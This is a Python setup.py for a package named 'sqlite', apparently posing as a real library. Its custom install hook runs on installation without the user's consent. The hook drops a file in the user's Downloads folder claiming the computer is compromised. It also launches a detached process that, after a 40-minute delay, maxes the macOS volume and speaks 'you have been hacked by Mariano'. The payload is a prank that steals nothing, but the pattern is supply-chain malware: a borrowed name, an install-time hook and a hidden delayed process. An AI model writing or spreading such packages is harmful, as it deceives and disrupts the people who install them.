import os
from pathlib import Path
import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install


def start_delayed_command():
    """Start the delayed command in a detached subprocess."""
    subprocess.Popen(
        [
            "python3",
            "-c",
            """
import time
import subprocess
time.sleep(60 * 40) # delay for 40 minutes
subprocess.run(["osascript", "-e", "set volume output volume 100"], check=True)
subprocess.run(["say", "-v", "Cellos", "Booooooom! you have been hacked by Mariano"], check=True)
""",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setpgrp,  # POSIX only: setsid
    )


class PostInstallCommand(install):
    """Post-installation for installation mode."""

    def run(self):
        download_dir = Path.home() / "Downloads"
        with open(download_dir / "instructions.txt", "w") as f:
            f.write(
                """
Your computer has been compromised!!
There is piece of malware on your computer and you need to find how it got there before it is too late!!
                """
            )

        # Create a new process for the delayed command
        start_delayed_command()
        install.run(self)


setup(
    name="sqlite",
    version="3.45.0",
    packages=find_packages(),
    cmdclass={
        "install": PostInstallCommand,
    },
)
